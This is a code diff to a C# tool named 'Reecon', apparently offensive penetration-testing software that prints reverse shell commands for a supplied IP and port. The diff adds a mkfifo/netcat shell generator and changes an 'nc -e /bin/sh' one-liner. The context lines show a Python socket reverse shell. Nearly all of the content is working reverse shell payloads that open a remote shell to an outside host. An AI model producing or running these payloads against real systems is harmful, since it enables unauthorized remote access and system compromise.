@@ -70,6 +70,12 @@ namespace Reecon
                 Console.WriteLine(PythonShell(ip, port));
 
             }
+            else if (shellType == "sh")
+            {
+                Console.WriteLine("sh Shell");
+                Console.WriteLine("--------");
+                Console.WriteLine(SHShell(ip, port));
+            }
             else if (shellType == "war")
             {
                 Console.WriteLine("WAR Shell");
@@ -101,7 +107,7 @@ namespace Reecon
 
         private static string NCShell(string ip, string port)
         {
-            string shellOne = $"nc -e /bin/sh {ip} {port}";
+            string shellOne = $"nc {ip} {port} -e /bin/sh";
             string shellTwo = $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
             return shellOne + Environment.NewLine + shellTwo;
         }
@@ -125,6 +131,11 @@ namespace Reecon
         private static string PythonShell(string ip, string port)
         {
             return $"import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('{ip}', {port})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(['/bin/bash', '-i']);";
+        }
+
+        private static string SHShell(string ip, string port)
+        {
+            return $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
         }
     }
 }
